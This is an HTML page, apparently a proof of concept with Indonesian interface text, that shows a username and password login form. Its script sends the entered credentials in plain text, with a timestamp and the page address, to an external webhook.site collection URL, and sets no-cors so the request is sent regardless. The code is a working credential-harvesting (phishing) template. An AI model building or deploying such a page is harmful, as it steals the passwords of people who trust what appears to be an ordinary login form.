<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Webhook Login TEST</title>
</head>
<body>

<h2>Login (Webhook POC)</h2>

<input id="username" placeholder="username"><br><br>
<input id="password" type="password" placeholder="password"><br><br>

<button onclick="send()">LOGIN & KIRIM</button>

<p id="status"></p>

<script>
const WEBHOOK_URL = "https://webhook.site/#!/view/6d1cbc58-73bd-46b8-8e6c-318aaf917a6e/195962e0-9440-433e-b1d1-d0d807a0db5e/1";

function send() {
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  if (!username || !password) {
    alert("Username dan password wajib diisi");
    return;
  }

  const data = {
    username: username,
    password: password,   // ‚ö†Ô∏è POC ONLY
    action: "login",
    time: new Date().toISOString(),
    page: window.location.href
  };

  fetch(WEBHOOK_URL, {
    method: "POST",
    mode: "no-cors",   // üî• bikin request PASTI terkirim
    body: JSON.stringify(data)
  });

  document.getElementById("status").innerText =
    "‚úÖ LOGIN DIKIRIM. CEK WEBHOOK.SITE!";
}
</script>

</body>
</html>
